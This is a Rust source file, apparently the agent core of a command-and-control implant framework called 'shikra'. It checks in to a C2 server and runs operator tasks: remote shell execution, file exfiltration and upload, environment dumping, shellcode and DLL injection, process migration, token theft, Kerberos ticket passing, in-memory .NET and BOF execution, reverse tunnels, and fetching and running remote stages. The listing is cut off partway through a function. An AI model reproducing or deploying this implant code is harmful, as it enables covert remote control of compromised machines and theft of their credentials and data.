use anyhow::{Context, Result};
use shikra_crypto::channel::SessionKeys;
use shikra_crypto::kex::KeyPair;
use shikra_crypto::signing::{verify, Identity};
use shikra_proto::v1::agent_link_client::AgentLinkClient;
use shikra_proto::v1::agent_message;
use shikra_proto::v1::{
    AgentHeartbeat, AgentMessage, AgentResult, AgentTask, Architecture, CheckInRequest, Envelope,
    Platform, SessionKind,
};
use shikra_transport::wire;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::{mpsc, Mutex};
use tokio_stream::wrappers::ReceiverStream;
use tonic::transport::{Certificate, Channel, ClientTlsConfig};

pub mod beacon;
pub mod bof;
pub mod dns;
pub mod dotnet;
pub mod embedded;
pub mod evasion;
pub mod fallback;
pub mod jobs;
pub mod kerb;
pub mod limits;
pub mod native;
pub mod netenum;
pub mod pipe;
pub mod post;
pub mod quic;
pub mod scan;
pub mod screenshot;
pub mod stager;
pub mod tunnel;
pub mod wasm;
pub mod wg;
pub mod win;
pub mod win_service;

pub use beacon::{run_beacon, BeaconConfig};
pub use bof::{execute as execute_bof, BofOutcome};
pub use dns::{run_dns_beacon, DnsConfig};
pub use embedded::EmbeddedConfig;
pub use evasion::{sleep_obfuscated, MaskedResults};
pub use fallback::{run_fallback, FallbackContext, TransportSpec};
pub use native::{NativeOutcome, NativeRegistry};
pub use post::{
    dll_inject, dll_reflect, dll_spawn, execute_assembly, inject, kill_process, make_token,
    migrate, rev2self, screenshot, self_exec, spawn_exec, spawn_process, steal_token,
};
pub use quic::{run_quic_beacon, QuicConfig};
pub use scan::{parse_ports, parse_targets, scan, ScanHit, ScanReport};
pub use stager::{run_stager, StagerConfig};
pub use tunnel::TunnelRuntime;
pub use wasm::{run_extension, WasmRegistry};
pub use wg::{run_wg_beacon, WgConfig};

pub const MAX_TRANSFER_CHUNK: usize = 1024 * 1024;
const MAX_CAPTURE: usize = 2 * 1024 * 1024;
const DEFAULT_SHELL_TIMEOUT_SECS: u64 = 60;
const MAX_SHELL_TIMEOUT_SECS: u64 = 600;

#[derive(Debug, Clone)]
pub struct AgentConfig {
    pub endpoint: String,
    pub ca_pem: String,
    pub server_identity: [u8; 32],
    pub enroll_token: String,
    pub domain: String,
    pub heartbeat_secs: u64,
    pub jitter_secs: u64,
    pub max_runtime_secs: Option<u64>,
}

#[derive(Debug)]
pub struct AgentState {
    pub cwd: PathBuf,
    pub rportfwd: std::collections::HashMap<String, bool>,
    pub wasm: WasmRegistry,
    pub native: NativeRegistry,
}

impl Default for AgentState {
    fn default() -> Self {
        Self {
            cwd: std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
            rportfwd: std::collections::HashMap::new(),
            wasm: WasmRegistry::new(),
            native: NativeRegistry::new(),
        }
    }
}

impl AgentState {
    pub fn resolve(&self, raw: &str) -> PathBuf {
        if raw.is_empty() {
            return self.cwd.clone();
        }
        let path = Path::new(raw);
        if path.is_absolute() {
            path.to_path_buf()
        } else {
            self.cwd.join(path)
        }
    }
}

pub async fn run_agent(config: AgentConfig) -> Result<()> {
    run_agent_piped(config, None).await
}

/// Like [`run_agent`], but when `pipe` is set the gRPC channel runs over a
/// named pipe (Windows/SMB) or Unix domain socket instead of TCP.
pub async fn run_agent_piped(config: AgentConfig, pipe: Option<String>) -> Result<()> {
    let tls = ClientTlsConfig::new()
        .ca_certificate(Certificate::from_pem(config.ca_pem.clone()))
        .domain_name(config.domain.clone());

    let endpoint = Channel::from_shared(config.endpoint.clone())
        .context("invalid C2 endpoint")?
        .tls_config(tls)
        .context("invalid TLS configuration")?;
    let channel = if let Some(pipe_path) = pipe {
        let connector = tower::service_fn(move |_uri: tonic::transport::Uri| {
            let pipe_path = pipe_path.clone();
            async move {
                crate::pipe::connect(&pipe_path)
                    .await
                    .map(hyper_util::rt::TokioIo::new)
                    .map_err(|err| std::io::Error::other(err.to_string()))
            }
        });
        endpoint
            .connect_with_connector(connector)
            .await
            .context("failed to connect to C2 over pipe")?
    } else {
        endpoint
            .connect()
            .await
            .context("failed to connect to C2")?
    };

    let mut client = AgentLinkClient::new(channel)
        .max_decoding_message_size(8 * 1024 * 1024)
        .max_encoding_message_size(8 * 1024 * 1024);

    let identity = Identity::generate();
    let kex = KeyPair::generate();
    let kex_public = kex.public_key();
    let signature = identity.sign(&wire::enroll_message(&kex_public));

    let request = CheckInRequest {
        identity_public: identity.public_key_bytes().to_vec(),
        kex_public: kex_public.to_vec(),
        identity_signature: signature.to_bytes().to_vec(),
        hostname: hostname(),
        username: username(),
        platform: current_platform(),
        architecture: current_architecture(),
        process_name: std::env::current_exe()
            .ok()
            .and_then(|path| path.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_default(),
        kind: SessionKind::Session as i32,
        enrollment_token: config.enroll_token.clone(),
        killdate_unix: limits::get().killdate_unix,
        working_hours: limits::get().working_hours.clone(),
    };

    let response = client
        .check_in(request)
        .await
        .context("CheckIn rejected")?
        .into_inner();

    let server_kex_public: [u8; 32] = response
        .server_kex_public
        .as_slice()
        .try_into()
        .map_err(|_| anyhow::anyhow!("server kex public key has wrong length"))?;

    verify(
        &config.server_identity,
        &wire::checkin_response_message(&response.session_id, &kex_public, &server_kex_public),
        &response.server_signature,
    )
    .context("server identity verification failed")?;

    let shared = kex.diffie_hellman(&server_kex_public);
    let keys = SessionKeys::derive(&response.session_id, &shared, true)
        .context("session key derivation failed")?;

    tracing::info!(
        session = %response.session_id,
        heartbeat = response.heartbeat_interval_secs,
        "checked in"
    );

    let state = Arc::new(Mutex::new(keys));
    let (out_tx, out_rx) = mpsc::channel::<Envelope>(64);

    // The server validates the first envelope before it returns response headers,
    // so the initial heartbeat must be queued before opening the stream.
    let initial_heartbeat = AgentMessage {
        body: Some(agent_message::Body::Heartbeat(AgentHeartbeat {
            unix_ms: now_unix_ms(),
        })),
    };
    {
        let mut keys = state.lock().await;
        let envelope = wire::seal_message(&mut keys, &initial_heartbeat)
            .context("failed to seal initial heartbeat")?;
        out_tx
            .send(envelope)
            .await
            .context("failed to queue initial heartbeat")?;
    }

    let outbound = ReceiverStream::new(out_rx);
    let mut inbound = client
        .stream_tasks(outbound)
        .await
        .context("StreamTasks rejected")?
        .into_inner();

    let heartbeat_secs = if response.heartbeat_interval_secs > 0 {
        response.heartbeat_interval_secs
    } else {
        config.heartbeat_secs
    };
    let jitter = config.jitter_secs;
    let deadline = config
        .max_runtime_secs
        .map(|secs| tokio::time::Instant::now() + Duration::from_secs(secs));

    let heartbeat_state = state.clone();
    let heartbeat_tx = out_tx.clone();
    let heartbeat_task = tokio::spawn(async move {
        loop {
            if limits::killdate_expired() {
                tracing::info!("killdate reached; exiting");
                std::process::exit(0);
            }
            let sleep_for = heartbeat_secs
                + if jitter > 0 {
                    rand::random::<u64>() % jitter
                } else {
                    0
                };
            tokio::time::sleep(Duration::from_secs(sleep_for)).await;

            let message = AgentMessage {
                body: Some(agent_message::Body::Heartbeat(AgentHeartbeat {
                    unix_ms: now_unix_ms(),
                })),
            };
            let envelope = {
                let mut keys = heartbeat_state.lock().await;
                match wire::seal_message(&mut keys, &message) {
                    Ok(envelope) => envelope,
                    Err(err) => {
                        tracing::error!(%err, "heartbeat seal failed");
                        break;
                    }
                }
            };
            if heartbeat_tx.send(envelope).await.is_err() {
                break;
            }
        }
    });

    let result_state = state.clone();
    let result_tx = out_tx.clone();
    let agent_state = std::sync::Arc::new(tokio::sync::Mutex::new(AgentState::default()));
    let tunnel_runtime = TunnelRuntime::new(state.clone(), out_tx.clone());

    loop {
        if limits::killdate_expired() {
            tracing::info!("killdate reached; exiting");
            std::process::exit(0);
        }
        let incoming = tokio::select! {
            message = inbound.message() => message,
            () = async {
                match deadline {
                    Some(deadline) => tokio::time::sleep_until(deadline).await,
                    None => std::future::pending::<()>().await,
                }
            } => {
                tracing::info!("max runtime reached");
                break;
            }
        };

        let envelope = match incoming {
            Ok(Some(envelope)) => envelope,
            Ok(None) => {
                tracing::warn!("server closed the task stream");
                break;
            }
            Err(err) => {
                tracing::warn!(%err, "task stream error");
                break;
            }
        };

        let message = {
            let mut keys = state.lock().await;
            match wire::open_message(&mut keys, &envelope) {
                Ok(message) => message,
                Err(err) => {
                    tracing::warn!(%err, "rejected inbound envelope");
                    continue;
                }
            }
        };

        match message.body {
            Some(agent_message::Body::Task(task)) => {
                let task_id = task.task_id.clone();
                if jobs::is_long_running(&task.kind) {
                    // Run long jobs concurrently so `job_kill`/`jobs` stay
                    // responsive while a command is executing.
                    let state = agent_state.clone();
                    let tunnel = tunnel_runtime.clone();
                    let result_state = result_state.clone();
                    let result_tx = result_tx.clone();
                    tokio::spawn(async move {
                        let handle = jobs::register(&task_id, &task.kind);
                        let outcome = {
                            let mut guard = state.lock().await;
                            execute_task(&mut guard, &task, Some(&tunnel)).await
                        };
                        let cancelled = jobs::cancelled(&handle);
                        jobs::finish(&task_id);
                        let outcome = if cancelled && outcome.exit_code != 137 {
                            TaskOutcome {
                                exit_code: 137,
                                stdout: Vec::new(),
                                stderr: "cancelled".into(),
                            }
                        } else {
                            outcome
                        };
                        let result_message = AgentMessage {
                            body: Some(agent_message::Body::Result(AgentResult {
                                task_id: task_id.clone(),
                                exit_code: outcome.exit_code,
                                stdout: outcome.stdout,
                                stderr: outcome.stderr.into_bytes(),
                            })),
                        };
                        let envelope = {
                            let mut keys = result_state.lock().await;
                            match wire::seal_message(&mut keys, &result_message) {
                                Ok(envelope) => envelope,
                                Err(err) => {
                                    tracing::error!(%err, "result seal failed");
                                    return;
                                }
                            }
                        };
                        if result_tx.send(envelope).await.is_err() {
                            tracing::warn!("failed to emit task result");
                        }
                    });
                    continue;
                }
                let outcome = {
                    let mut guard = agent_state.lock().await;
                    execute_task(&mut guard, &task, Some(&tunnel_runtime)).await
                };
                let result_message = AgentMessage {
                    body: Some(agent_message::Body::Result(AgentResult {
                        task_id,
                        exit_code: outcome.exit_code,
                        stdout: outcome.stdout,
                        stderr: outcome.stderr.into_bytes(),
                    })),
                };
                let envelope = {
                    let mut keys = result_state.lock().await;
                    match wire::seal_message(&mut keys, &result_message) {
                        Ok(envelope) => envelope,
                        Err(err) => {
                            tracing::error!(%err, "result seal failed");
                            break;
                        }
                    }
                };
                if result_tx.send(envelope).await.is_err() {
                    tracing::warn!("failed to emit task result");
                    break;
                }
            }
            Some(agent_message::Body::TunnelOpen(open)) => {
                // `open()` registers the tunnel before returning, so data
                // frames arriving immediately after are buffered, not dropped.
                tunnel_runtime
                    .open(open.tunnel_id, open.host, open.port as u16)
                    .await;
            }
            Some(agent_message::Body::TunnelData(data)) => {
                if !tunnel_runtime
                    .write(&data.tunnel_id, data.data.clone())
                    .await
                {
                    tunnel_runtime
                        .close(data.tunnel_id, "unknown tunnel".into())
                        .await;
                }
            }
            Some(agent_message::Body::TunnelClose(close)) => {
                tunnel_runtime.close(close.tunnel_id, close.reason).await;
            }
            Some(agent_message::Body::Heartbeat(_))
            | Some(agent_message::Body::Result(_))
            | Some(agent_message::Body::Results(_))
            | Some(agent_message::Body::Tasks(_))
            | Some(agent_message::Body::TunnelAccept(_))
            | None => {}
        }
    }

    heartbeat_task.abort();
    Ok(())
}

#[derive(Debug)]
pub struct TaskOutcome {
    pub exit_code: i32,
    pub stdout: Vec<u8>,
    pub stderr: String,
}

impl TaskOutcome {
    fn ok(stdout: impl Into<Vec<u8>>) -> Self {
        Self {
            exit_code: 0,
            stdout: stdout.into(),
            stderr: String::new(),
        }
    }

    fn fail(message: impl Into<String>) -> Self {
        Self {
            exit_code: 1,
            stdout: Vec::new(),
            stderr: message.into(),
        }
    }
}

pub async fn execute_task(
    state: &mut AgentState,
    task: &AgentTask,
    tunnel: Option<&TunnelRuntime>,
) -> TaskOutcome {
    let args = parse_args(task);
    let result = match task.kind.as_str() {
        "whoami" => TaskOutcome::ok(username()),
        "hostname" => TaskOutcome::ok(hostname()),
        "pwd" => TaskOutcome::ok(state.cwd.display().to_string()),
        "cd" => task_cd(state, &args),
        "echo" => TaskOutcome::ok(args.as_str().unwrap_or_default().to_string()),
        "shell" => task_shell(task, &args).await,
        "ls" => task_ls(state, &args),
        "cat" => task_cat(state, &args),
        "stat" => task_stat(state, &args),
        "rm" => task_rm(state, &args),
        "mkdir" => task_mkdir(state, &args),
        "mv" => task_mv(state, &args),
        "cp" => task_cp(state, &args),
        "download" => task_download(state, &args),
        "upload" => task_upload(state, task, &args),
        "env" => task_env(),
        "ps" => task_ps().await,
        "procs" => task_procs().await,
        "net" => netenum::task_net(&args),
        "kerb_list" => kerb::task_klist(&args),
        "kerb_ptt" => kerb::task_ptt(&args),
        "kerb_purge" => kerb::task_purge(&args),
        "jobs" => TaskOutcome {
            exit_code: 0,
            stdout: jobs::list_json(),
            stderr: String::new(),
        },
        "job_kill" => {
            let target = args
                .get("task_id")
                .and_then(|value| value.as_str())
                .unwrap_or_default();
            if jobs::cancel(target) {
                TaskOutcome::ok(format!("cancelling {target}"))
            } else {
                TaskOutcome::fail(format!("unknown job {target}"))
            }
        }
        "job_suspend" => {
            let target = args
                .get("task_id")
                .and_then(|value| value.as_str())
                .unwrap_or_default();
            if jobs::set_paused(target, true) {
                TaskOutcome::ok(format!("paused {target}"))
            } else {
                TaskOutcome::fail(format!("unknown job {target}"))
            }
        }
        "job_resume" => {
            let target = args
                .get("task_id")
                .and_then(|value| value.as_str())
                .unwrap_or_default();
            if jobs::set_paused(target, false) {
                TaskOutcome::ok(format!("resumed {target}"))
            } else {
                TaskOutcome::fail(format!("unknown job {target}"))
            }
        }
        "netstat" => task_netstat().await,
        "ifconfig" => task_ifconfig().await,
        "registry_read" => {
            let hive = arg_str(&args, "hive").unwrap_or_else(|| "HKLM".into());
            let path = arg_str(&args, "path").unwrap_or_default();
            let value_name = arg_str(&args, "value").unwrap_or_default();
            win::registry_read(&hive, &path, &value_name)
        }
        "registry_list" => {
            let hive = arg_str(&args, "hive").unwrap_or_else(|| "HKLM".into());
            let path = arg_str(&args, "path").unwrap_or_default();
            win::registry_list(&hive, &path)
        }
        "services" => win::services_list(),
        "rportfwd_start" | "rportfwd_stop" => match tunnel {
            Some(runtime) => {
                tunnel::handle_rportfwd_task(runtime, state, task.kind.as_str(), &args).await
            }
            None => TaskOutcome::fail("rportfwd requires a session tunnel runtime"),
        },
        "bof" => task_bof(task, &args),
        "native_load" => task_native_load(state, task, &args),
        "native_run" => task_native_run(state, &args),
        "native_list" => TaskOutcome::ok(state.native.list().join("\n")),
        "native_remove" => {
            let name = arg_str(&args, "name").unwrap_or_default();
            if state.native.remove(&name) {
                TaskOutcome::ok(format!("removed {name}"))
            } else {
                TaskOutcome::fail(format!("no extension named {name}"))
            }
        }
        "wasm_load" => task_wasm_load(state, task, &args),
        "wasm_run" => task_wasm_run(state, &args),
        "wasm_list" => TaskOutcome::ok(state.wasm.list().join("\n")),
        "wasm_remove" => {
            let name = arg_str(&args, "name").unwrap_or_default();
            if state.wasm.remove(&name) {
                TaskOutcome::ok(format!("removed {name}"))
            } else {
                TaskOutcome::fail(format!("no extension named {name}"))
            }
        }
        "sleep" => {
            let secs = args.as_u64().unwrap_or(1).min(300);
            tokio::time::sleep(Duration::from_secs(secs)).await;
            TaskOutcome::ok(format!("slept {secs}s"))
        }
        "spawn" => {
            let command = arg_str(&args, "command").unwrap_or_default();
            if command.is_empty() {
                return TaskOutcome::fail("spawn requires a command");
            }
            let extra: Vec<String> = args
                .get("args")
                .and_then(|value| value.as_array())
                .map(|items| {
                    items
                        .iter()
                        .filter_map(|item| item.as_str().map(str::to_string))
                        .collect()
                })
                .unwrap_or_default();
            let hidden = args
                .get("hidden")
                .and_then(|value| value.as_bool())
                .unwrap_or(true);
            post::spawn_process(&command, &extra, hidden)
        }
        "kill" => {
            let pid = args.get("pid").and_then(|value| value.as_u64());
            match pid {
                Some(pid) => post::kill_process(pid as u32),
                None => TaskOutcome::fail("kill requires a pid"),
            }
        }
        "dll_inject" => match (task_pid(&args), arg_str(&args, "path")) {
            (Some(pid), Some(path)) => dll_inject(pid, &path),
            _ => TaskOutcome::fail("dll_inject requires pid and path"),
        },
        "dll_reflect" => match task_payload(&args, "payload") {
            Some(image) => dll_reflect(&image),
            None => TaskOutcome::fail("dll_reflect requires a payload (base64 DLL)"),
        },
        "dll_spawn" => match arg_str(&args, "path") {
            Some(path) => dll_spawn(&path),
            None => TaskOutcome::fail("dll_spawn requires path"),
        },
        "self_exec" => match task_shellcode(&args) {
            Some(shellcode) => self_exec(&shellcode),
            None => TaskOutcome::fail("self_exec requires shellcode (base64)"),
        },
        "spawn_exec" => match task_shellcode(&args) {
            Some(shellcode) => {
                let command = arg_str(&args, "command");
                spawn_exec(command.as_deref(), &shellcode)
            }
            None => TaskOutcome::fail("spawn_exec requires shellcode (base64)"),
        },
        "inject" => match (task_pid(&args), task_shellcode(&args)) {
            (Some(pid), Some(shellcode)) => post::inject(pid, &shellcode),
            (None, _) => TaskOutcome::fail("inject requires a pid"),
            (_, None) => TaskOutcome::fail("inject requires base64 shellcode"),
        },
        "migrate" => match (task_pid(&args), task_shellcode(&args)) {
            (Some(pid), Some(shellcode)) => post::migrate(pid, &shellcode),
            (None, _) => TaskOutcome::fail("migrate requires a pid"),
            (_, None) => TaskOutcome::fail("migrate requires base64 shellcode"),
        },
        "steal_token" => match task_pid(&args) {
            Some(pid) => post::steal_token(pid),
            None => TaskOutcome::fail("steal_token requires a pid"),
        },
        "make_token" => {
            let user = arg_str(&args, "user").unwrap_or_default();
            let password = arg_str(&args, "password").unwrap_or_default();
            if user.is_empty() || password.is_empty() {
                return TaskOutcome::fail("make_token requires user and password");
            }
            let domain = arg_str(&args, "domain").unwrap_or_else(|| ".".into());
            post::make_token(&domain, &user, &password)
        }
        "rev2self" => post::rev2self(),
        "execute_assembly" => match task_payload(&args, "assembly") {
            Some(assembly) => {
                let extra = arg_str(&args, "arguments").unwrap_or_default();
                post::execute_assembly(&assembly, &extra)
            }
            None => TaskOutcome::fail("execute_assembly requires base64 assembly bytes"),
        },
        "screenshot" => post::screenshot(),
        "portscan" => scan::task_portscan(task, &args).await,
        "stage_run" => {
            let url = arg_str(&args, "url").unwrap_or_default();
            let key = arg_str(&args, "key").unwrap_or_default();
            if url.is_empty() || key.is_empty() {
                return TaskOutcome::fail("stage_run requires url and key");
            }
            let extra: Vec<String> = args
                .get("args")
                .and_then(|value| value.as_array())
                .map(|items| {
                    items
                        .iter()
                        .filter_map(|item| item.as_str().map(str::to_string))
                        .collect()
                })
                .unwrap_or_default();
            stager::task_stage_run(url, key, extra).await
        }
        other => TaskOutcome::fail(format!("unknown task kind: {other}")),
    };
    result
}

fn task_pid(args: &serde_json::Value) -> Option<u32> {
    args.get("pid")
        .and_then(|value| value.as_u64())
        .map(|pid| pid as u32)
}

fn task_shellcode(args: &serde_json::Value) -> Option<Vec<u8>> {
    task_payload(args, "shellcode")
}

fn task_payload(args: &serde_json::Value, key: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    let raw = args.get(key).and_then(|value| value.as_str())?;
    base64::engine::general_purpose::STANDARD
        .decode(raw.trim())
        .ok()
}

fn parse_args(task: &AgentTask) -> serde_json::Value {
    if task.args.is_empty() {
        serde_json::Value::Null
    } else {
        serde_json::from_slice(&task.args).unwrap_or(serde_json::Value::Null)
    }
}

fn arg_str(args: &serde_json::Value, key: &str) -> Option<String> {
    args.get(key)
        .and_then(|value| value.as_str())
        .map(|value| value.to_string())
}

fn task_cd(state: &mut AgentState, args: &serde_json::Value) -> TaskOutcome {
    let target = match arg_str(args, "path") {
        Some(path) => path,
        None => return TaskOutcome::fail("cd requires a path"),
    };
    let resolved = state.resolve(&target);
    match std::fs::canonicalize(&resolved) {
        Ok(canonical) if canonical.is_dir() => {
            state.cwd = canonical.clone();
            TaskOutcome::ok(canonical.display().to_string())
        }
        Ok(_) => TaskOutcome::fail(format!("{} is not a directory", resolved.display())),
        Err(err) => TaskOutcome::fail(format!("cd failed: {err}")),
    }
}

async fn task_shell(task: &AgentTask, args: &serde_json::Value) -> TaskOutcome {
    let command = match arg_str(args, "command") {
        Some(command) if !command.is_empty() => command,
        _ => return TaskOutcome::fail("shell requires a command"),
    };
    let timeout_secs = args
        .get("timeout_secs")
        .and_then(|value| value.as_u64())
        .unwrap_or(DEFAULT_SHELL_TIMEOUT_SECS)
        .min(MAX_SHELL_TIMEOUT_SECS);

    let mut cmd;
    #[cfg(windows)]
    {
        cmd = tokio::process::Command::new("cmd");
        cmd.arg("/C").arg(&command);
    }
    #[cfg(unix)]
    {
        cmd = tokio::process::Command::new("/bin/sh");
        cmd.arg("-c").arg(&command);
    }
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);

    let child = match cmd.spawn() {
        Ok(child) => child,
        Err(err) => return TaskOutcome::fail(format!("failed to spawn command: {err}")),
    };

    // Dropping the waiting future drops the child (kill_on_drop), so a cancel
    // notification terminates the process tree on both platforms.
    let cancel = jobs::cancel_flag(&task.task_id);
    tokio::select! {
        result = tokio::time::timeout(Duration::from_secs(timeout_secs), child.wait_with_output()) => {
            match result {
                Ok(Ok(output)) => {
                    let mut stdout = output.stdout;
                    stdout.truncate(MAX_CAPTURE);
                    let mut stderr = String::from_utf8_lossy(&output.stderr).to_string();
                    if stderr.len() > MAX_CAPTURE {
                        stderr.truncate(MAX_CAPTURE);
                    }
                    TaskOutcome {
                        exit_code: output.status.code().unwrap_or(-1),
                        stdout,
                        stderr,
                    }
                }
                Ok(Err(err)) => TaskOutcome::fail(format!("command failed: {err}")),
                Err(_) => TaskOutcome::fail(format!("command timed out after {timeout_secs}s")),
            }
        }
        _ = jobs::wait_cancel(cancel), if jobs::cancel_flag(&task.task_id).is_some() => {
            TaskOutcome {
                exit_code: 137,
                stdout: Vec::new(),
                stderr: "cancelled".into(),
            }
        }
    }
}

fn task_ls(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let target = arg_str(args, "path").unwrap_or_else(|| ".".into());
    let resolved = state.resolve(&target);
    match std::fs::read_dir(&resolved) {
        Ok(entries) => {
            let mut rows: Vec<serde_json::Value> = entries
                .filter_map(|entry| entry.ok())
                .map(|entry| {
                    let metadata = entry.metadata().ok();
                    serde_json::json!({
                        "name": entry.file_name().to_string_lossy(),
                        "is_dir": metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false),
                        "size": metadata.as_ref().map(|m| m.len()).unwrap_or(0),
                    })
                })
                .collect();
            rows.sort_by(|a, b| {
                a["name"]
                    .as_str()
                    .unwrap_or_default()
                    .cmp(b["name"].as_str().unwrap_or_default())
            });
            TaskOutcome::ok(serde_json::to_string(&rows).unwrap_or_default())
        }
        Err(err) => TaskOutcome::fail(format!("ls failed: {err}")),
    }
}

fn task_cat(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let target = match arg_str(args, "path") {
        Some(path) => path,
        None => return TaskOutcome::fail("cat requires a path"),
    };
    let resolved = state.resolve(&target);
    match std::fs::read(&resolved) {
        Ok(mut contents) => {
            if contents.len() > MAX_CAPTURE {
                contents.truncate(MAX_CAPTURE);
            }
            TaskOutcome::ok(contents)
        }
        Err(err) => TaskOutcome::fail(format!("cat failed: {err}")),
    }
}

fn task_stat(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let target = match arg_str(args, "path") {
        Some(path) => path,
        None => return TaskOutcome::fail("stat requires a path"),
    };
    let resolved = state.resolve(&target);
    match std::fs::metadata(&resolved) {
        Ok(metadata) => {
            let modified = metadata
                .modified()
                .ok()
                .and_then(|time| time.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|duration| duration.as_millis() as u64)
                .unwrap_or(0);
            TaskOutcome::ok(
                serde_json::json!({
                    "path": resolved.display().to_string(),
                    "size": metadata.len(),
                    "is_dir": metadata.is_dir(),
                    "is_file": metadata.is_file(),
                    "readonly": metadata.permissions().readonly(),
                    "modified_ms": modified,
                })
                .to_string(),
            )
        }
        Err(err) => TaskOutcome::fail(format!("stat failed: {err}")),
    }
}

fn task_rm(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let target = match arg_str(args, "path") {
        Some(path) => path,
        None => return TaskOutcome::fail("rm requires a path"),
    };
    let recursive = args
        .get("recursive")
        .and_then(|value| value.as_bool())
        .unwrap_or(false);
    let resolved = state.resolve(&target);
    let result = if recursive && resolved.is_dir() {
        std::fs::remove_dir_all(&resolved)
    } else if resolved.is_dir() {
        std::fs::remove_dir(&resolved)
    } else {
        std::fs::remove_file(&resolved)
    };
    match result {
        Ok(()) => TaskOutcome::ok(format!("removed {}", resolved.display())),
        Err(err) => TaskOutcome::fail(format!("rm failed: {err}")),
    }
}

fn task_mkdir(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let target = match arg_str(args, "path") {
        Some(path) => path,
        None => return TaskOutcome::fail("mkdir requires a path"),
    };
    let parents = args
        .get("parents")
        .and_then(|value| value.as_bool())
        .unwrap_or(true);
    let resolved = state.resolve(&target);
    let result = if parents {
        std::fs::create_dir_all(&resolved)
    } else {
        std::fs::create_dir(&resolved)
    };
    match result {
        Ok(()) => TaskOutcome::ok(format!("created {}", resolved.display())),
        Err(err) => TaskOutcome::fail(format!("mkdir failed: {err}")),
    }
}

fn task_mv(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let (from, to) = match (arg_str(args, "from"), arg_str(args, "to")) {
        (Some(from), Some(to)) => (from, to),
        _ => return TaskOutcome::fail("mv requires from and to"),
    };
    let from = state.resolve(&from);
    let to = state.resolve(&to);
    match std::fs::rename(&from, &to) {
        Ok(()) => TaskOutcome::ok(format!("moved to {}", to.display())),
        Err(rename_err) => match std::fs::copy(&from, &to) {
            Ok(_) => match std::fs::remove_file(&from) {
                Ok(()) => TaskOutcome::ok(format!("moved to {}", to.display())),
                Err(err) => TaskOutcome::fail(format!("mv cleanup failed: {err}")),
            },
            Err(_) => TaskOutcome::fail(format!("mv failed: {rename_err}")),
        },
    }
}

fn task_cp(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let (from, to) = match (arg_str(args, "from"), arg_str(args, "to")) {
        (Some(from), Some(to)) => (from, to),
        _ => return TaskOutcome::fail("cp requires from and to"),
    };
    let from = state.resolve(&from);
    let to = state.resolve(&to);
    match std::fs::copy(&from, &to) {
        Ok(copied) => TaskOutcome::ok(format!("copied {copied} bytes to {}", to.display())),
        Err(err) => TaskOutcome::fail(format!("cp failed: {err}")),
    }
}

fn task_download(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let target = match arg_str(args, "path") {
        Some(path) => path,
        None => return TaskOutcome::fail("download requires a path"),
    };
    let offset = args
        .get("offset")
        .and_then(|value| value.as_u64())
        .unwrap_or(0);
    let length = args
        .get("length")
        .and_then(|value| value.as_u64())
        .unwrap_or(MAX_TRANSFER_CHUNK as u64)
        .min(MAX_TRANSFER_CHUNK as u64) as usize;

    let resolved = state.resolve(&target);
    match std::fs::File::open(&resolved) {
        Ok(mut file) => {
            use std::io::{Read, Seek, SeekFrom};
            if let Err(err) = file.seek(SeekFrom::Start(offset)) {
                return TaskOutcome::fail(format!("seek failed: {err}"));
            }
            let mut buffer = vec![0u8; length];
            match file.read(&mut buffer) {
                Ok(read) => {
                    buffer.truncate(read);
                    TaskOutcome::ok(buffer)
                }
                Err(err) => TaskOutcome::fail(format!("read failed: {err}")),
            }
        }
        Err(err) => TaskOutcome::fail(format!("download failed: {err}")),
    }
}

fn task_upload(state: &AgentState, task: &AgentTask, args: &serde_json::Value) -> TaskOutcome {
    let target = match arg_str(args, "path") {
        Some(path) => path,
        None => return TaskOutcome::fail("upload requires a path"),
    };
    if task.payload.is_empty() {
        return TaskOutcome::fail("upload requires payload bytes");
    }
    let offset = args
        .get("offset")
        .and_then(|value| value.as_u64())
        .unwrap_or(0);
    let resolved = state.resolve(&target);

    let result = if offset == 0 {
        std::fs::write(&resolved, &task.payload)
    } else {
        use std::io::{Seek, SeekFrom, Write};
        std::fs::OpenOptions::new()
            .write(true)
            .open(&resolved)
            .and_then(|mut file| {
                file.seek(SeekFrom::Start(offset))?;
                file.write_all(&task.payload)
            })
    };

    match result {
        Ok(()) => TaskOutcome::ok(format!(
            "wrote {} bytes at offset {} to {}",
            task.payload.len(),
            offset,
            resolved.display()
        )),
        Err(err) => TaskOutcome::fail(format!("upload failed: {err}")),
    }
}

fn task_env() -> TaskOutcome {
    let vars: serde_json::Map<String, serde_json::Value> = std::env::vars()
        .map(|(key, value)| (key, serde_json::Value::String(value)))
        .collect();
    TaskOutcome::ok(serde_json::Value::Object(vars).to_string())
}

fn task_bof(task: &AgentTask, args: &serde_json::Value) -> TaskOutcome {
    if task.payload.is_empty() {
        return TaskOutcome::fail("bof requires an object-file payload");
    }
    let arguments = match args.get("args") {
        Some(serde_json::Value::String(text)) => text.clone().into_bytes(),
        Some(serde_json::Value::Array(values)) => {
            let mut bytes = Vec::new();
            for value in values {
                match value {
                    serde_json::Value::String(text) => bytes.extend_from_slice(text.as_bytes()),
                    other => bytes.extend_from_slice(other.to_string().as_bytes()),
                }
                bytes.push(0);
            }
            bytes
        }
        _ => Vec::new(),
    };

    match bof::execute(&task.payload, &arguments) {
        Ok(outcome) => {
            if outcome.output.is_empty() {
                TaskOutcome::ok(format!("bof completed (exit {})", outcome.exit_code))
            } else {
                TaskOutcome::ok(outcome.output)
            }
        }
        Err(err) => TaskOutcome::fail(format!("bof failed: {err}")),
    }
}

fn task_native_load(
    state: &mut AgentState,
    task: &AgentTask,
    args: &serde_json::Value,
) -> TaskOutcome {
    let name = match arg_str(args, "name") {
        Some(name) if !name.is_empty() => name,
        _ => return TaskOutcome::fail("native_load requires a name"),
    };
    let path = arg_str(args, "path");
